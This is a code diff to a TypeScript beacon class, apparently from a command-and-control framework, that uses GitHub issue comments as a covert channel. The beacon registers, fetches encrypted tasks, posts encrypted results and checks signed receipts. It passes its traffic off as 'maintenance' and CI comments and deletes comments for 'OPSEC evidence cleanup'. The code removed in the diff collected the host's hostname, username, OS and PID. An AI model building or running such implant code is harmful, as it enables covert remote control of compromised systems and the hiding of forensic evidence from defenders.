@@ -25,7 +25,16 @@
  */
 
 import { hostname as osHostname } from "node:os";
-import type { CheckinPayload, Task, TaskResult } from "../types.ts";
+import type {
+  CheckinPayload,
+  Task,
+  TaskResult,
+  ResultSubmissionOutcome,
+} from "../types.ts";
+import {
+  computeTaskResultDigest,
+  parseResultAcceptanceReceipt,
+} from "@octoc2/shared";
 import { BaseTentacle } from "./BaseTentacle.ts";
 import {
   sealBox, decryptBox,
@@ -58,6 +67,36 @@ const NONCE_RE      = /<!--\s+(-|[A-Za-z0-9_-]{4,})\s+-->/;
 // Read poll config at call-time so tests can override via env before checkin() is called
 const getPollTimeoutMs = () => parseInt(process.env["SVC_POLL_TIMEOUT_MS"] ?? "30000", 10);
 const getPollRetryMs   = () => parseInt(process.env["SVC_POLL_RETRY_MS"]   ?? "10000", 10);
+const getResultAckTimeoutMs = () =>
+  parseNonNegativeMs(process.env["SVC_RESULT_ACK_TIMEOUT_MS"], 120_000);
+const getResultAckRetryMs = () =>
+  parsePositiveMs(process.env["SVC_RESULT_ACK_RETRY_MS"], 5_000);
+const RESULT_ACK_MAX_AGE_MS = 5 * 60_000;
+const RESULT_ACK_FUTURE_SKEW_MS = 60_000;
+
+function parseNonNegativeMs(
+  raw: string | undefined,
+  fallback: number,
+): number {
+  if (raw === undefined || raw.trim() === "") return fallback;
+  const value = Number(raw);
+  if (!Number.isSafeInteger(value) || value < 0) {
+    throw new Error("Result acknowledgement timeout must be a non-negative integer");
+  }
+  return value;
+}
+
+function parsePositiveMs(
+  raw: string | undefined,
+  fallback: number,
+): number {
+  if (raw === undefined || raw.trim() === "") return fallback;
+  const value = Number(raw);
+  if (!Number.isSafeInteger(value) || value <= 0) {
+    throw new Error("Result acknowledgement retry interval must be a positive integer");
+  }
+  return value;
+}
 
 // ── Maintenance session constants ─────────────────────────────────────────────
 
@@ -151,6 +190,9 @@ export class IssuesTentacle extends BaseTentacle {
    * them during init and return them on the first checkin() instead.
    */
   private pendingInitialTasks: Task[] = [];
+  private registrationAckReceived = false;
+  /** Signed check-in sequence that binds an ACK across proxy relay hops. */
+  private pendingRegistrationSequence: number | null = null;
 
   /** Rate-limit gate: epoch-ms before which upsertMaintenanceComment() is a no-op. */
   private nextMaintenanceUpdateMs = 0;
@@ -188,7 +230,7 @@ export class IssuesTentacle extends BaseTentacle {
 
   // ── Initialization ───────────────────────────────────────────────────────────
 
-  private async ensureInitialized(): Promise<void> {
+  private async ensureInitialized(initialCheckin?: CheckinPayload): Promise<void> {
     if (this.initialized) return;
 
     // Surface a persistent init error immediately (don't retry fatal failures)
@@ -204,7 +246,7 @@ export class IssuesTentacle extends BaseTentacle {
 
     // Deduplicate concurrent calls (e.g. checkin + submitResult race)
     if (!this.initPromise) {
-      this.initPromise = this._initialize().catch((err) => {
+      this.initPromise = this._initialize(initialCheckin).catch((err) => {
         this.initError = err as Error;
         this.initErrorAt = Date.now();
         this.initPromise = null;
@@ -226,7 +268,7 @@ export class IssuesTentacle extends BaseTentacle {
     return false;
   }
 
-  private async _initialize(): Promise<void> {
+  private async _initialize(initialCheckin?: CheckinPayload): Promise<void> {
     // 1. Fetch operator public key from GitHub Variable
     await this.fetchOperatorPublicKey();
 
@@ -242,7 +284,12 @@ export class IssuesTentacle extends BaseTentacle {
 
     // 4. Send registration comment if server hasn't ACK'd yet
     if (this.state!.registrationStatus === "pending") {
-      await this.register();
+      if (!initialCheckin?.identity) {
+        throw new Error(
+          "IssuesTentacle: a signed checkin is required for registration",
+        );
+      }
+      await this.register(initialCheckin);
     }
 
     this.initialized = true;
@@ -275,15 +322,93 @@ export class IssuesTentacle extends BaseTentacle {
       );
     }
 
-    this.operatorPublicKey = await base64ToBytes(b64);
+    const repositoryKey = await base64ToBytes(b64);
+    if (repositoryKey.length !== 32) {
+      throw new Error(
+        `[IssuesTentacle] GitHub Variable '${OPERATOR_PUBKEY_VAR}' is not a 32-byte key`,
+      );
+    }
+    if (this.config.issuesRequireOperatorKeyMatch) {
+      if (
+        this.config.operatorPublicKey.length !== repositoryKey.length ||
+        repositoryKey.some(
+          (byte, index) => byte !== this.config.operatorPublicKey[index],
+        )
+      ) {
+        throw new Error(
+          `[IssuesTentacle] GitHub Variable '${OPERATOR_PUBKEY_VAR}' does not match the signed proxy configuration`,
+        );
+      }
+      this.operatorPublicKey = this.config.operatorPublicKey.slice();
+      return;
+    }
+    this.operatorPublicKey = repositoryKey;
   }
 
   // ── State file ────────────────────────────────────────────────────────────────
 
   private async loadOrCreateStateFile(): Promise<void> {
-    const existing = await loadState(this.config.id);
+    const stateScope = this.config.issuesStateScope;
+    const provisionedIssue = this.config.issuesIssueNumber;
+    if (
+      stateScope &&
+      (
+        !Number.isSafeInteger(provisionedIssue) ||
+        provisionedIssue! <= 0
+      )
+    ) {
+      throw new Error(
+        "IssuesTentacle: scoped state requires a positive provisioned issue number",
+      );
+    }
+    if (this.config.state && !stateScope) {
+      this.state = this.config.state;
+      return;
+    }
+    const signing = this.config.signingKeyPair && this.config.signingKeyId
+      ? {
+          publicKey: await bytesToBase64(this.config.signingKeyPair.publicKey),
+          secretKey: await bytesToBase64(this.config.signingKeyPair.secretKey),
+          keyId: this.config.signingKeyId,
+        }
+      : undefined;
+    const existing = await loadState(
+      this.config.id,
+      signing ? { signingKeyPair: signing } : undefined,
+      stateScope,
+    );
     if (existing) {
+      const configuredEncryptionKeys = {
+        publicKey: await bytesToBase64(this.config.beaconKeyPair.publicKey),
+        secretKey: await bytesToBase64(this.config.beaconKeyPair.secretKey),
+      };
+      if (
+        existing.keyPair.publicKey !== configuredEncryptionKeys.publicKey ||
+        existing.keyPair.secretKey !== configuredEncryptionKeys.secretKey
+      ) {
+        throw new Error(
+          "IssuesTentacle: persisted X25519 identity does not match the active beacon identity",
+        );
+      }
+      if (
+        !signing ||
+        existing.signingKeyPair.publicKey !== signing.publicKey ||
+        existing.signingKeyPair.secretKey !== signing.secretKey ||
+        existing.signingKeyPair.keyId !== signing.keyId
+      ) {
+        throw new Error(
+          "IssuesTentacle: persisted Ed25519 identity does not match the active beacon identity",
+        );
+      }
+      if (
+        provisionedIssue !== undefined &&
+        existing.issueNumber !== provisionedIssue
+      ) {
+        existing.resetIssuesState(provisionedIssue);
+        await existing.persist();
+      }
       this.state = existing;
+      if (!stateScope) this.config.state = existing;
       return;
     }
 
@@ -297,7 +422,21 @@ export class IssuesTentacle extends BaseTentacle {
     const publicKey  = await bytesToBase64(kp.publicKey);
     const secretKey  = await bytesToBase64(kp.secretKey);
 
-    this.state = await createState(this.config.id, { publicKey, secretKey });
+    if (!signing) {
+      throw new Error("A pre-provisioned Ed25519 signing identity is required");
+    }
+    this.state = await createState(
+      this.config.id,
+      { publicKey, secretKey },
+      signing,
+      {
+        ...(stateScope !== undefined && { scope: stateScope }),
+        ...(provisionedIssue !== undefined && {
+          issueNumber: provisionedIssue,
+        }),
+      },
+    );
+    if (!stateScope) this.config.state = this.state;
     // config.beaconKeyPair is already correct — no update needed.
 
     console.log(`[IssuesTentacle] Created state file at ${this.state.filePath}`);
@@ -358,26 +497,20 @@ export class IssuesTentacle extends BaseTentacle {
    * The sealed payload includes this beacon's public key so the server can
    * register it and encrypt subsequent task deliveries to it.
    */
-  private async register(): Promise<void> {
+  private async register(payload: CheckinPayload): Promise<void> {
     const state = this.state!;
     const seq   = state.nextSeq();
 
-    const host = osHostname();
-    const now  = new Date().toISOString();
-
-    const regPayload = {
-      beaconId:     state.beaconId,
-      publicKey:    state.keyPair.publicKey,
-      hostname:     host,
-      username:     process.env["USER"] ?? process.env["USERNAME"] ?? "unknown",
-      os:           process.platform,
-      arch:         process.arch,
-      pid:          process.pid,
-      registeredAt: now,
-    };
+    if (
+      payload.beaconId !== state.beaconId ||
+      payload.publicKey !== state.keyPair.publicKey ||
+      !payload.identity
+    ) {
+      throw new Error("IssuesTentacle: registration identity does not match state");
+    }
 
     const ciphertextB64 = await sealBox(
-      JSON.stringify(regPayload),
+      JSON.stringify(payload),
       this.operatorPublicKey!
     );
 
@@ -394,9 +527,26 @@ export class IssuesTentacle extends BaseTentacle {
     await state.persist();
 
     // Wait for server ACK ([job:...:deploy:reg-ack])
-    const ackTasks = await this.pollForDeployComments(postedAt, getPollTimeoutMs());
+    this.registrationAckReceived = false;
+    this.pendingRegistrationSequence = payload.identity.sequence;
+    let ackTasks: Task[];
+    try {
+      ackTasks = await this.pollForDeployComments(
+        postedAt,
+        this.config.issuesRegistrationAckTimeoutMs ?? getPollTimeoutMs(),
+      );
+    } finally {
+      this.pendingRegistrationSequence = null;
+    }
 
-    // Any deploy comment (including an empty task list) counts as ACK
+    if (!this.registrationAckReceived) {
+      state.registrationStatus = "pending";
+      await state.persist();
+      throw new Error(
+        "IssuesTentacle: registration ACK timed out; registration remains pending",
+      );
+    }
+
     state.registrationStatus = "registered";
     await state.persist();
 
@@ -408,19 +558,9 @@ export class IssuesTentacle extends BaseTentacle {
     });
 
     // Trigger the first maintenance comment immediately after registration.
-    // This ensures maintenanceCommentId is set before the first checkin() call,
-    // so checkin() skips the CI heartbeat from the start.
-    const registrationPayload: CheckinPayload = {
-      beaconId:  state.beaconId,
-      publicKey: state.keyPair.publicKey,
-      hostname:  host,
-      username:  regPayload.username,
-      os:        process.platform,
-      arch:      process.arch,
-      pid:       process.pid,
-      checkinAt: now,
-    };
-    await this.upsertMaintenanceComment(registrationPayload);
+    // The visible maintenance view is independent from the signed,
+    // machine-readable CI heartbeat that is updated every checkin.
+    await this.upsertMaintenanceComment(payload);
 
     // OPSEC: delete the registration comment now that maintenance is established.
     // The server has already ACK'd, so the comment has served its purpose.
@@ -452,7 +592,7 @@ export class IssuesTentacle extends BaseTentacle {
   // ── checkin ───────────────────────────────────────────────────────────────────
 
   async checkin(payload: CheckinPayload): Promise<Task[]> {
-    await this.ensureInitialized();
+    await this.ensureInitialized(payload);
 
     // Tasks captured during registration polling (before the first checkin)
     // would be invisible to a normal poll (their IDs are already below
@@ -482,41 +622,50 @@ export class IssuesTentacle extends BaseTentacle {
 
     const body = buildBeaconComment("ci", seq, payload, ciphertextB64);
 
-    const skipNormalComment = state.initialMaintenancePosted;
-    console.log(`[checkin] maintenanceCommentId: ${state.maintenanceCommentId ?? "none"}, skippedNormalComment: ${skipNormalComment}`);
-
     // Update the maintenance session comment first (rate-limited).
     await this.upsertMaintenanceComment(payload);
 
-    // Skip the CI heartbeat once maintenance is established (it carries all visible status).
-    // initialMaintenancePosted persists across restarts so this is effective from the very
-    // first checkin even after process restarts.
-    if (!skipNormalComment) {
-      const { owner, name: repo } = this.config.repo;
-      if (state.ciCommentId) {
+    // Maintenance is presentation only. The signed machine-readable heartbeat
+    // remains authoritative and must be updated every cycle so delivery is
+    // always scoped to a freshly authenticated checkin.
+    const { owner, name: repo } = this.config.repo;
+    if (state.ciCommentId) {
+      try {
         await this.octokit.rest.issues.updateComment({
           owner, repo,
           comment_id: state.ciCommentId,
           body,
         });
-      } else {
-        const created = await this.octokit.rest.issues.createComment({
-          owner, repo,
-          issue_number: state.issueNumber!,
-          body,
-        });
-        state.ciCommentId = created.data.id;
+      } catch (err: unknown) {
+        const status = (err as { status?: number }).status;
+        if (status === 404) {
+          // Cleanup and prior sessions can remove the persisted heartbeat.
+          // Treat a missing comment as stale state and recreate it below.
+          state.ciCommentId = null;
+          await state.persist();
+        } else {
+          throw err;
+        }
       }
-      await state.persist();
     }
+
+    if (!state.ciCommentId) {
+      const created = await this.octokit.rest.issues.createComment({
+        owner, repo,
+        issue_number: state.issueNumber!,
+        body,
+      });
+      state.ciCommentId = created.data.id;
+    }
+    await state.persist();
 
     // Prune old result comments (OPSEC evidence cleanup)
     await this.pruneOldComments();
 
-    // Look back 10 minutes so tasks queued between poll windows are never
-    // missed. The lastTaskCommentId cursor handles deduplication.
-    const lookbackMs = 10 * 60 * 1000;
-    const since = new Date(Date.now() - lookbackMs).toISOString();
+    // Query the retained comment window from the beginning. A task can remain
+    // unread across a long outage, and the persistent comment-ID cursor
+    // handles deduplication without a time-based loss window.
+    const since = new Date(0).toISOString();
     const tasks = await this.pollForDeployComments(since, getPollTimeoutMs());
 
     // Track newly received tasks in the maintenance session list
@@ -534,7 +683,7 @@ export class IssuesTentacle extends BaseTentacle {
 
   // ── submitResult ─────────────────────────────────────────────────────────────
 
-  async submitResult(result: TaskResult): Promise<void> {
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
     await this.ensureInitialized();
 
     const state = this.state!;
@@ -559,8 +708,17 @@ export class IssuesTentacle extends BaseTentacle {
 
     const body = buildResultComment(seq, visiblePayload, ciphertextB64);
 
+    const postedAt = new Date(Date.now() - 1_000).toISOString();
     await this.postComment(body);
     await state.persist();
+
+    const resultDigest = await computeTaskResultDigest(result);
+    const controllerAccepted = await this.pollForResultAcceptance(
+      result,
+      resultDigest,
+      postedAt,
+      getResultAckTimeoutMs(),
+    );
 
     // Update task status in the in-memory maintenance roster
     const record = this.maintenanceTasks.find((t) => t.taskId === result.taskId);
@@ -570,6 +728,12 @@ export class IssuesTentacle extends BaseTentacle {
 
     // Refresh the maintenance comment (rate-limited — may be a no-op)
     await this.upsertMaintenanceComment(visiblePayload);
+    return {
+      artifactWritten: true,
+      controllerAccepted,
+      channel: "issues",
+      acceptance: controllerAccepted ? "channel-receipt" : null,
+    };
   }
 
   // ── Poll for task delivery comments ──────────────────────────────────────────
@@ -579,6 +743,105 @@ export class IssuesTentacle extends BaseTentacle {
    * `since` (ISO-8601). Retries every POLL_RETRY_MS until POLL_TIMEOUT_MS
    * elapses, then returns whatever tasks were found (possibly none).
    */
+  private async pollForResultAcceptance(
+    result: TaskResult,
+    resultDigest: string,
+    since: string,
+    timeoutMs: number,
+  ): Promise<boolean> {
+    const state = this.state!;
+    const deadline = Date.now() + timeoutMs;
+    const issueNumber = state.issueNumber!;
+    const { owner, name: repo } = this.config.repo;
+    const expectedRef = `result-ack-${result.taskId}`;
+    let firstAttempt = true;
+
+    while (firstAttempt || Date.now() < deadline) {
+      firstAttempt = false;
+      const comments = await this.octokit.rest.issues.listComments({
+        owner,
+        repo,
+        issue_number: issueNumber,
+        since,
+        per_page: 100,
+      });
+
+      let accepted = false;
+      for (const comment of comments.data) {
+        const parsed = parseComment(comment.body ?? "");
+        if (
+          parsed?.type !== "deploy" ||
+          parsed.ref !== expectedRef
+        ) {
+          continue;
+        }
+        try {
+          await this.validateResultAcceptance(
+            parsed,
+            result,
+            resultDigest,
+          );
+        } catch (error) {
+          console.warn(
+            `[IssuesTentacle] Ignoring invalid result acceptance ${comment.id}: ` +
+            `${(error as Error).message}`,
+          );
+          continue;
+        }
+        accepted = true;
+
+        try {
+          await this.octokit.rest.issues.deleteComment({
+            owner,
+            repo,
+            comment_id: comment.id,
+          });
+        } catch {
+          // The authenticated receipt is sufficient; deletion is best-effort.
+        }
+      }
+      if (accepted) return true;
+
+      const remainingMs = deadline - Date.now();
+      if (remainingMs <= 0) break;
+      await sleep(Math.min(getResultAckRetryMs(), remainingMs));
+    }
+    return false;
+  }
+
+  private async validateResultAcceptance(
+    parsed: ParsedComment,
+    result: TaskResult,
+    resultDigest: string,
+  ): Promise<void> {
+    if (parsed.nonce === "-") {
+      throw new Error("receipt has a placeholder nonce");
+    }
+    const plaintext = await decryptBox(
+      parsed.ciphertext,
+      parsed.nonce,
+      this.operatorPublicKey!,
+      await base64ToBytes(this.state!.keyPair.secretKey),
+    );
+    const receipt = parseResultAcceptanceReceipt(
+      JSON.parse(sodiumBytesToString(plaintext)),
+    );
+    if (
+      receipt.beaconId !== result.beaconId ||
+      receipt.taskId !== result.taskId ||
+      receipt.resultDigest !== resultDigest
+    ) {
+      throw new Error("receipt binding does not match the submitted result");
+    }
+    const ageMs = Date.now() - Date.parse(receipt.acceptedAt);
+    if (
+      ageMs > RESULT_ACK_MAX_AGE_MS ||
+      ageMs < -RESULT_ACK_FUTURE_SKEW_MS
+    ) {
+      throw new Error("receipt is outside the accepted freshness window");
+    }
+  }
+
   private async pollForDeployComments(
     since: string,
     timeoutMs: number
@@ -613,9 +876,13 @@ export class IssuesTentacle extends BaseTentacle {
 
           const parsed = parseComment(comment.body ?? "");
           if (!parsed) continue;
+          if (parsed.ref.startsWith("result-ack-")) {
+            continue;
+          }
 
           try {
-            // Decrypts to [] for ACK-only comments (e.g. reg-ack with empty task array)
+            // A registration ACK is an explicit object; ordinary deliveries
+            // remain task arrays.
             const task = await this.decryptTaskComment(parsed);
             tasks.push(...task);
             state.lastTaskCommentId = Math.max(state.lastTaskCommentId ?? 0, comment.id);
@@ -634,7 +901,8 @@ export class IssuesTentacle extends BaseTentacle {
         }
 
         // Return as soon as we've processed any deploy comment from the server —
-        // an empty task array is a valid ACK (e.g. reg-ack or checkin with no tasks).
+        // Explicit registration ACKs and empty task deliveries are both
+        // actionable comments, so return after either is processed.
         if (processedAny) {
           await state.persist();
           return tasks;
@@ -670,13 +938,29 @@ export class IssuesTentacle extends BaseTentacle {
     );
 
     const decoded = sodiumBytesToString(plaintext);
-    const tasks   = JSON.parse(decoded) as Task[];
-
-    if (!Array.isArray(tasks)) {
-      throw new Error("Decrypted task payload is not an array");
+    const payload: unknown = JSON.parse(decoded);
+    const registrationAck =
+      parsed.ref === "reg-ack" &&
+      typeof payload === "object" &&
+      payload !== null &&
+      !Array.isArray(payload) &&
+      (payload as Record<string, unknown>)["kind"] === "registration-ack" &&
+      (payload as Record<string, unknown>)["beaconId"] === this.state!.beaconId;
+    const commentBound = registrationAck &&
+      (payload as Record<string, unknown>)["registrationId"] ===
+        String(this.state!.regCommentId);
+    const sequenceBound = registrationAck &&
+      this.pendingRegistrationSequence !== null &&
+      (payload as Record<string, unknown>)["registrationSequence"] ===
+        this.pendingRegistrationSequence;
+    if (commentBound || sequenceBound) {
+      this.registrationAckReceived = true;
+      return [];
     }
-
-    return tasks;
+    if (!Array.isArray(payload)) {
+      throw new Error("Decrypted task payload is neither a task array nor registration ACK");
+    }
+    return payload as Task[];
   }
 
   // ── Maintenance session comment ────────────────────────────────────────────────
@@ -778,7 +1062,8 @@ export class IssuesTentacle extends BaseTentacle {
    * 60 seconds from the tracked issue.
    *
    * Runs every startup but is safe to repeat (idempotent). Designed to catch
-   * leftover comments from previous sessions — reg, old deploys, old results.
+   * leftover comments from previous sessions — reg and old results. Unread
+   * deploy comments remain until successfully decrypted.
    * Spares only the current session's infra update comment; sync comments
    * from prior sessions (identified by a different session UUID) are treated as
    * stale and deleted along with all other non-sync comments. Any comment
@@ -807,7 +1092,9 @@ export class IssuesTentacle extends BaseTentacle {
     const MAINT_SESSION_RE = /<!-- infra-maintenance:([0-9a-f-]+) -->/;
 
     const nonMaintenance = comments.filter(
-      (c) => !c.body?.includes("<!-- infra-maintenance:")
+      (c) =>
+        !c.body?.includes("<!-- infra-maintenance:") &&
+        !this.isUnreadDeployComment(c)
     );
 
     // Maintenance comments from a different session (e.g. state loss caused a
@@ -840,8 +1127,7 @@ export class IssuesTentacle extends BaseTentacle {
 
   /**
    * Delete all non-maintenance comments older than 30 seconds from the
-   * beacon's issue. Only comments containing the `<!-- infra-maintenance: -->`
-   * marker are spared — everything else is treated as ephemeral and removed.
+   * beacon's issue. Maintenance and unread deploy comments are spared.
    */
   private async pruneOldComments(): Promise<void> {
     const state = this.state!;
@@ -861,6 +1147,9 @@ export class IssuesTentacle extends BaseTentacle {
     for (const comment of comments.data) {
       // Never delete the maintenance/ops comment
       if (/<!--\s*infra-maintenance:/.test(comment.body ?? "")) continue;
+      // A deploy remains authoritative until its comment ID is committed to
+      // the persistent cursor after successful decryption.
+      if (this.isUnreadDeployComment(comment)) continue;
 
       // Result comments (logs) survive for 30 min so the operator can read them
       if (/<!--\s*job:\d+:logs:/.test(comment.body ?? "")) {
@@ -870,16 +1159,38 @@ export class IssuesTentacle extends BaseTentacle {
         if (comment.created_at >= ciCutoffISO) continue;
       }
 
-      await this.octokit.rest.issues.deleteComment({
-        owner,
-        repo,
-        comment_id: comment.id,
-      });
-      console.log(`[IssuesTentacle] Pruned comment #${comment.id}`);
+      try {
+        await this.octokit.rest.issues.deleteComment({
+          owner,
+          repo,
+          comment_id: comment.id,
+        });
+        console.log(`[IssuesTentacle] Pruned comment #${comment.id}`);
+      } catch (error) {
+        if (/<!--\s*job:\d+:deploy:result-ack-/m.test(comment.body ?? "")) {
+          console.warn(
+            `[IssuesTentacle] Could not prune result receipt #${comment.id}: ${
+              (error as Error).message
+            }`,
+          );
+          continue;
+        }
+        throw error;
+      }
     }
   }
 
   // ── Post comment helper ───────────────────────────────────────────────────────
+
+  private isUnreadDeployComment(
+    comment: { id: number; body?: string | null },
+  ): boolean {
+    const body = comment.body ?? "";
+    if (!/<!--\s*job:\d+:deploy:/m.test(body)) return false;
+    if (/<!--\s*job:\d+:deploy:result-ack-/m.test(body)) return false;
+    const cursor = this.state?.lastTaskCommentId;
+    return cursor === null || cursor === undefined || comment.id > cursor;
+  }
 
   private async postComment(body: string): Promise<number> {
     const { owner, name: repo } = this.config.repo;
